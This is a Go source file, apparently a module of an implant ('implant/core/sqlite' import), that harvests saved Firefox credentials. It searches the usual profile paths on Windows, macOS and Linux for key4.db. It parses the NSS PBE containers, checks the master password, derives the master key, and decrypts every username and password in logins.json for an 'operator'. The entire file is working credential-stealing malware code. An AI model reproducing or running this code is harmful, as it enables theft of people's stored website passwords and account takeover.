package services

import (
	"bytes"
	"crypto/sha1"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"

	"implant/core/sqlite"
)

// ===== Firefox / NSS key4.db + logins.json 解析 =====
//
// 算法出处：lclevy/firepwd 的 firepwd.py（`decryptPBE` / `decryptMoz3DES` /
// `decodeLoginData` / `getKey`），该实现明确支持到 NSS 3.49 / Firefox 144。
// 密码学原语在 nss_crypto.go，本文件只负责**容器解析与编排**。
//
// 验证方式（这是关键，见 firefox_nss_test.go）：
// 测试向量**不是**自造的，而是从**真实 Firefox 配置**里抽出的字节
// （unode/firefox_decrypt 测试套件里的 test_profile_firefox_nopassword_114 等，
// 该套件用 libnss 做真值）。期望明文取自同套件的 exported_passwords.csv。
// 因此这条链路的正确性是对着**真实 Firefox 产物**验证的，而不是自洽测试。
//
// 注：那套夹具是 GPL-3，未随本仓库分发；这里只嵌入从其中抽出的**数据字节**
// （盐、密文、期望明文），不含对方任何代码。

var (
	errNSSNoKey4      = errors.New("未找到 key4.db")
	errNSSPasswordBad = errors.New("主口令不正确（password-check 校验失败）")
)

// Firefox 用到的 OID
var (
	oidPBES2        = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 13}
	oidPBKDF2       = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 12}
	oidHMACSHA256   = asn1.ObjectIdentifier{1, 2, 840, 113549, 2, 9}
	oidAES256CBC    = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 42}
	oidPBE3DES      = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 12, 5, 1, 3}
	oidDESEDE3CBC   = asn1.ObjectIdentifier{1, 2, 840, 113549, 3, 7}
	oidAES256CBClog = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 42}
)

// passwordCheck 是 key4.db 里用于校验主口令的固定明文。
//
// 注意这里写的是**去填充后**的形态：firepwd 拿它跟 `password-check\x02\x02`
// 比，是因为 firepwd 的 decryptPBE 不做去填充（它只对 logins.json 条目 unpad）。
// 本实现统一在解密函数里去填充，所以这里对应的是 14 字节的裸串。
// 两边比的是同一件事，只是"填充是否已剥离"这一点不同 —— 照抄 firepwd 的
// 16 字节常量会一直校验失败。
var passwordCheck = []byte("password-check")

// nssPBEBlob 一个 PBE 容器的解析结果
type nssPBEBlob struct {
	legacy     bool   // 走 Mozilla KDF + 3DES
	entrySalt  []byte // PBES2：32 字节；legacy：20 字节
	iterations int
	keyLength  int
	iv         []byte // PBES2 用（已按 NSS 怪癖补成 16 字节）
	ciphertext []byte
}

// parsePBEBlob 解析 key4.db 里 metadata.item2 / nssPrivate.a11 这类 PBE 容器。
//
// 两种形态（结构来自 firepwd 的注释与实测）：
//
//	legacy（1.2.840.113549.1.12.5.1.3）:
//	  SEQUENCE { SEQUENCE { OID, SEQUENCE { OCTETSTRING entrySalt, INTEGER 1 } }, OCTETSTRING ct }
//
//	PBES2（1.2.840.113549.1.5.13）:
//	  SEQUENCE { SEQUENCE { OID, SEQUENCE {
//	               SEQUENCE { OID pbkdf2, SEQUENCE { OCTETSTRING salt, INTEGER iter,
//	                                                  INTEGER keyLen, SEQUENCE { OID hmac } } },
//	               SEQUENCE { OID aes256-cbc, OCTETSTRING iv(14) } } },
//	             OCTETSTRING ct }
func parsePBEBlob(blob []byte) (*nssPBEBlob, error) {
	var outer asn1.RawValue
	if _, err := asn1.Unmarshal(blob, &outer); err != nil {
		return nil, fmt.Errorf("PBE 容器不是合法 DER: %w", err)
	}
	if outer.Tag != asn1.TagSequence {
		return nil, fmt.Errorf("PBE 容器顶层应为 SEQUENCE，实际 tag=%d", outer.Tag)
	}
	inner, err := rawChildren(outer.Bytes)
	if err != nil {
		return nil, err
	}
	if len(inner) < 2 {
		return nil, errors.New("PBE 容器结构不完整（需要算法段与密文段）")
	}

	algSeq, err := rawChildren(inner[0].Bytes)
	if err != nil {
		return nil, err
	}
	if len(algSeq) < 2 {
		return nil, errors.New("PBE 算法段结构不完整")
	}
	var oid asn1.ObjectIdentifier
	if _, err := asn1.Unmarshal(algSeq[0].FullBytes, &oid); err != nil {
		return nil, fmt.Errorf("无法解析 PBE 算法 OID: %w", err)
	}
	ciphertext := inner[1].Bytes

	out := &nssPBEBlob{ciphertext: ciphertext}

	switch {
	case oid.Equal(oidPBE3DES):
		// 参数段：SEQUENCE { OCTETSTRING entrySalt, INTEGER 1 }
		params, err := rawChildren(algSeq[1].Bytes)
		if err != nil {
			return nil, err
		}
		if len(params) < 1 {
			return nil, errors.New("legacy PBE 缺少 entrySalt")
		}
		out.legacy = true
		out.entrySalt = params[0].Bytes
		return out, nil

	case oid.Equal(oidPBES2):
		params, err := rawChildren(algSeq[1].Bytes)
		if err != nil {
			return nil, err
		}
		if len(params) < 2 {
			return nil, errors.New("PBES2 参数段结构不完整")
		}
		// params[0] = SEQUENCE { OID pbkdf2, SEQUENCE {...} }
		kdfSeq, err := rawChildren(params[0].Bytes)
		if err != nil {
			return nil, err
		}
		if len(kdfSeq) < 2 {
			return nil, errors.New("PBKDF2 段结构不完整")
		}
		var kdfOID asn1.ObjectIdentifier
		if _, err := asn1.Unmarshal(kdfSeq[0].FullBytes, &kdfOID); err != nil {
			return nil, fmt.Errorf("无法解析 KDF OID: %w", err)
		}
		if !kdfOID.Equal(oidPBKDF2) {
			return nil, fmt.Errorf("不支持的 KDF OID: %v", kdfOID)
		}
		kdfParams, err := rawChildren(kdfSeq[1].Bytes)
		if err != nil {
			return nil, err
		}
		if len(kdfParams) < 3 {
			return nil, errors.New("PBKDF2 参数不足（需要 salt/迭代次数/密钥长度）")
		}
		// PRF 必须是 hmacWithSHA256：换别的（如 SHA1）会静默派生错密钥。
		// 实测文件里是 SEQUENCE { OID hmacWithSHA256 }，这里显式校验而不是忽略。
		if len(kdfParams) >= 4 {
			prfKids, err := rawChildren(kdfParams[3].Bytes)
			if err != nil {
				return nil, fmt.Errorf("无法解析 PBKDF2 PRF 段: %w", err)
			}
			if len(prfKids) >= 1 {
				var prfOID asn1.ObjectIdentifier
				if _, err := asn1.Unmarshal(prfKids[0].FullBytes, &prfOID); err != nil {
					return nil, fmt.Errorf("无法解析 PRF OID: %w", err)
				}
				if !prfOID.Equal(oidHMACSHA256) {
					return nil, fmt.Errorf("不支持的 PBKDF2 PRF: %v（仅支持 hmacWithSHA256）", prfOID)
				}
			}
		}
		out.entrySalt = kdfParams[0].Bytes
		if _, err := asn1.Unmarshal(kdfParams[1].FullBytes, &out.iterations); err != nil {
			return nil, fmt.Errorf("无法解析迭代次数: %w", err)
		}
		if _, err := asn1.Unmarshal(kdfParams[2].FullBytes, &out.keyLength); err != nil {
			return nil, fmt.Errorf("无法解析密钥长度: %w", err)
		}
		// params[1] = SEQUENCE { OID aes256-cbc, OCTETSTRING iv }
		encSeq, err := rawChildren(params[1].Bytes)
		if err != nil {
			return nil, err
		}
		if len(encSeq) < 2 {
			return nil, errors.New("加密算法段结构不完整")
		}
		var encOID asn1.ObjectIdentifier
		if _, err := asn1.Unmarshal(encSeq[0].FullBytes, &encOID); err != nil {
			return nil, fmt.Errorf("无法解析加密算法 OID: %w", err)
		}
		if !encOID.Equal(oidAES256CBC) {
			return nil, fmt.Errorf("不支持的加密算法 OID: %v", encOID)
		}
		iv, err := nssIVFromOctetString(encSeq[1].Bytes)
		if err != nil {
			return nil, err
		}
		out.iv = iv
		return out, nil

	default:
		return nil, fmt.Errorf("不支持的 PBE 算法 OID: %v", oid)
	}
}

// rawChildren 把一段 DER 内容拆成连续的 RawValue 序列
func rawChildren(b []byte) ([]asn1.RawValue, error) {
	var out []asn1.RawValue
	rest := b
	for len(rest) > 0 {
		var rv asn1.RawValue
		var err error
		rest, err = asn1.Unmarshal(rest, &rv)
		if err != nil {
			return nil, fmt.Errorf("DER 子元素解析失败: %w", err)
		}
		out = append(out, rv)
	}
	return out, nil
}

// nssDecryptPBEBlob 解密一个 PBE 容器，返回明文。
//
// globalSalt 来自 metadata.item1；masterPassword 为**原始字节**（未设主口令时为空）。
// PBES2 路径的 PBKDF2 口令是 SHA1(globalSalt||masterPassword) 这个摘要，
// 而不是可打印口令 —— 传错会解不开且看不出原因。
func nssDecryptPBEBlob(blob *nssPBEBlob, globalSalt, masterPassword []byte) ([]byte, error) {
	if blob.legacy {
		key, iv := nssMozKDF(globalSalt, masterPassword, blob.entrySalt)
		return nssTripleDESCBCDecrypt(key, iv, blob.ciphertext)
	}
	// PBES2：k = SHA1(globalSalt || masterPassword)，再 PBKDF2-HMAC-SHA256
	hp := sha1.Sum(concat(globalSalt, masterPassword))
	keyLen := blob.keyLength
	if keyLen <= 0 {
		keyLen = 32
	}
	clear, err := pbes2AES256CBCDecrypt(hp[:], blob.entrySalt, blob.iv, blob.ciphertext, blob.iterations)
	if err != nil {
		return nil, err
	}
	return clear, nil
}

// nssKey4Item 从 key4.db 读出指定表的原始列
type nssKey4Item struct {
	GlobalSalt []byte
	Item2      []byte
	A11        []byte
	A102       []byte
}

// nssReadKey4 读 key4.db 的 metadata 与 nssPrivate 两张表
func nssReadKey4(path string) (*nssKey4Item, error) {
	db, err := sqlite.Open(path)
	if err != nil {
		return nil, fmt.Errorf("打开 key4.db 失败: %w", err)
	}
	defer db.Close()

	meta, err := db.Table("metadata")
	if err != nil {
		return nil, fmt.Errorf("key4.db 缺少 metadata 表: %w", err)
	}
	rows, err := meta.Rows(nil)
	if err != nil {
		return nil, fmt.Errorf("读取 metadata 失败: %w", err)
	}
	out := &nssKey4Item{}
	for _, r := range rows {
		id := nssAsString(r["id"])
		if id != "password" {
			continue
		}
		out.GlobalSalt = asBytes(r["item1"])
		out.Item2 = asBytes(r["item2"])
	}
	if len(out.GlobalSalt) == 0 || len(out.Item2) == 0 {
		return nil, errors.New("key4.db 的 metadata 里没有 password 行")
	}

	priv, err := db.Table("nssPrivate")
	if err != nil {
		return nil, fmt.Errorf("key4.db 缺少 nssPrivate 表: %w", err)
	}
	prows, err := priv.Rows(nil)
	if err != nil {
		return nil, fmt.Errorf("读取 nssPrivate 失败: %w", err)
	}
	for _, r := range prows {
		a11 := asBytes(r["a11"])
		if len(a11) == 0 {
			continue
		}
		out.A11 = a11
		out.A102 = asBytes(r["a102"])
		break
	}
	if len(out.A11) == 0 {
		return nil, errors.New("key4.db 的 nssPrivate 里没有 a11（无保存的凭据）")
	}
	return out, nil
}

// nssAsString 把 sqlite 读出来的值转成字符串（列可能是 string 也可能 []byte）
func nssAsString(v interface{}) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case []byte:
		return string(t)
	default:
		return fmt.Sprintf("%v", t)
	}
}

// asBytes 把 sqlite 读出来的值转成字节。
// 驱动可能给 []byte 也可能给 string（取决于列的序列类型），两种都认。
func asBytes(v interface{}) []byte {
	switch t := v.(type) {
	case nil:
		return nil
	case []byte:
		return t
	case string:
		return []byte(t)
	default:
		return nil
	}
}

// nssMasterKey 从 key4.db 解出主密钥。
//
// 流程（与 firepwd 的 getKey 一致）：
//  1. metadata.item1 = globalSalt；item2 = 加密的 "password-check" 串
//  2. 用主口令解密 item2，明文应等于 "password-check\x02\x02" —— 不等就是口令错
//  3. 解密 nssPrivate.a11 得到主密钥（供 logins.json 使用）
func nssMasterKey(key4Path string, masterPassword []byte) ([]byte, error) {
	item, err := nssReadKey4(key4Path)
	if err != nil {
		return nil, err
	}

	checkBlob, err := parsePBEBlob(item.Item2)
	if err != nil {
		return nil, fmt.Errorf("解析 metadata.item2 失败: %w", err)
	}
	checkClear, err := nssDecryptPBEBlob(checkBlob, item.GlobalSalt, masterPassword)
	if err != nil {
		return nil, err
	}
	// 口令校验：明文不是固定的 password-check 串即说明口令不对。
	// 这一步不能省 —— 否则错口令会一路走到"解出乱码凭据"。
	if !bytes.Equal(checkClear, passwordCheck) {
		return nil, errNSSPasswordBad
	}

	keyBlob, err := parsePBEBlob(item.A11)
	if err != nil {
		return nil, fmt.Errorf("解析 nssPrivate.a11 失败: %w", err)
	}
	clear, err := nssDecryptPBEBlob(keyBlob, item.GlobalSalt, masterPassword)
	if err != nil {
		return nil, err
	}
	// a11 的明文本身是 DER：SEQUENCE { OCTETSTRING 主密钥 }（新版本）。
	// 老版本可能直接给裸密钥，故两种都接受。
	if key, ok := unwrapOctetString(clear); ok {
		return key, nil
	}
	return clear, nil
}

// unwrapOctetString 尝试把 `SEQUENCE { OCTETSTRING x }` 拆出 x。
// 不是这个形状时返回 false（调用方回退到原样使用）。
func unwrapOctetString(b []byte) ([]byte, bool) {
	var outer asn1.RawValue
	rest, err := asn1.Unmarshal(b, &outer)
	if err != nil || len(rest) != 0 || outer.Tag != asn1.TagSequence {
		return nil, false
	}
	kids, err := rawChildren(outer.Bytes)
	if err != nil || len(kids) != 1 || kids[0].Tag != asn1.TagOctetString {
		return nil, false
	}
	return kids[0].Bytes, true
}

// nssLogin 一条解出的 Firefox 保存凭据。
//
// 字段解密失败时**不丢弃整条**，而是把失败记在对应字段上：
// 凭据工具静默丢条目等于丢证据。真实 profile 里确实存在
// "用户名解不开、口令能解开"这类条目（夹具里就有一条故意的损坏样本），
// 操作员需要看到它存在且知道哪一半没解出来。
type nssLogin struct {
	URL      string
	Username string
	Password string
	// 对应字段解密失败的原因（空串表示成功）
	UsernameError string
	PasswordError string
}

// Complete 两个字段都解出来了
func (l nssLogin) Complete() bool {
	return l.UsernameError == "" && l.PasswordError == ""
}

// nssDecryptLoginField 解密 logins.json 里单个字段（encryptedUsername/Password）。
//
// 结构（firepwd 的 decodeLoginData）：
//
//	SEQUENCE {
//	  OCTETSTRING keyId
//	  SEQUENCE { OBJECTIDENTIFIER des-ede3-cbc | aes256-cbc, OCTETSTRING iv }
//	  OCTETSTRING ciphertext
//	}
//
// 密钥就是主密钥：24 字节时走 3DES，48 字节时截断到 32 走 AES-256。
// 算法按**条目里声明的 OID** 选，而不是猜 —— 同一份 logins.json 里可能混用。
func nssDecryptLoginField(masterKey []byte, b64 string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", fmt.Errorf("base64 解码失败: %w", err)
	}
	var outer asn1.RawValue
	if _, err := asn1.Unmarshal(raw, &outer); err != nil {
		return "", fmt.Errorf("登录条目不是合法 DER: %w", err)
	}
	kids, err := rawChildren(outer.Bytes)
	if err != nil {
		return "", err
	}
	if len(kids) < 3 {
		return "", errors.New("登录条目结构不完整")
	}
	algKids, err := rawChildren(kids[1].Bytes)
	if err != nil {
		return "", err
	}
	if len(algKids) < 2 {
		return "", errors.New("登录条目的算法段不完整")
	}
	var algOID asn1.ObjectIdentifier
	if _, err := asn1.Unmarshal(algKids[0].FullBytes, &algOID); err != nil {
		return "", fmt.Errorf("无法解析条目算法 OID: %w", err)
	}
	iv := algKids[1].Bytes
	ciphertext := kids[2].Bytes

	var plain []byte
	switch {
	case algOID.Equal(oidDESEDE3CBC):
		plain, err = nssTripleDESCBCDecrypt(masterKey, iv, ciphertext)
	case algOID.Equal(oidAES256CBClog):
		plain, err = nssAES256CBCDecrypt(masterKey, iv, ciphertext)
	default:
		return "", fmt.Errorf("不支持的条目加密算法 OID: %v", algOID)
	}
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// nssReadLogins 读取并解密 profile 目录下 logins.json 的全部条目。
func nssReadLogins(profileDir string, masterKey []byte) ([]nssLogin, error) {
	path := filepath.Join(profileDir, "logins.json")
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("读取 logins.json 失败: %w", err)
	}
	var doc struct {
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		} `json:"logins"`
	}
	if err := json.Unmarshal(data, &doc); err != nil {
		return nil, fmt.Errorf("logins.json 不是合法 JSON: %w", err)
	}

	var out []nssLogin
	for _, e := range doc.Logins {
		entry := nssLogin{URL: e.Hostname}
		user, err := nssDecryptLoginField(masterKey, e.EncryptedUsername)
		if err != nil {
			entry.UsernameError = err.Error()
		} else {
			entry.Username = user
		}
		pass, err := nssDecryptLoginField(masterKey, e.EncryptedPassword)
		if err != nil {
			entry.PasswordError = err.Error()
		} else {
			entry.Password = pass
		}
		out = append(out, entry)
	}
	return out, nil
}

// nssExtractFirefox 一站式：给定 profile 目录与主口令，返回全部凭据。
func nssExtractFirefox(profileDir string, masterPassword []byte) ([]nssLogin, error) {
	key4 := filepath.Join(profileDir, "key4.db")
	if _, err := os.Stat(key4); err != nil {
		return nil, errNSSNoKey4
	}
	key, err := nssMasterKey(key4, masterPassword)
	if err != nil {
		return nil, err
	}
	return nssReadLogins(profileDir, key)
}

// nssFirefoxProfileDirs 列出各平台常见的 Firefox profile 目录。
//
// 只列存在的目录；找不到返回空（调用方决定是否报错）。
func nssFirefoxProfileDirs() []string {
	var roots []string
	if appData := os.Getenv("APPDATA"); appData != "" {
		roots = append(roots, filepath.Join(appData, "Mozilla", "Firefox"))
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		roots = append(roots,
			filepath.Join(home, "Library", "Application Support", "Firefox"), // macOS
			filepath.Join(home, ".mozilla", "firefox"),                       // Linux
			filepath.Join(home, "snap", "firefox", "common", ".mozilla", "firefox"),
		)
	}
	var out []string
	for _, root := range roots {
		// Profiles 子目录（Windows/macOS）与根目录（Linux）都要看
		for _, base := range []string{filepath.Join(root, "Profiles"), root} {
			entries, err := os.ReadDir(base)
			if err != nil {
				continue
			}
			for _, e := range entries {
				if !e.IsDir() {
					continue
				}
				dir := filepath.Join(base, e.Name())
				// 只收真正含 key4.db 的目录，避免把一堆无关目录带出去
				if _, err := os.Stat(filepath.Join(dir, "key4.db")); err == nil {
					out = append(out, dir)
				}
			}
		}
	}
	return out
}

// nssLooksLikeFirefoxProfile 判断目录是否像 Firefox profile（有 key4.db 或 logins.json）
func nssLooksLikeFirefoxProfile(dir string) bool {
	for _, f := range []string{"key4.db", "logins.json"} {
		if _, err := os.Stat(filepath.Join(dir, f)); err == nil {
			return true
		}
	}
	return false
}
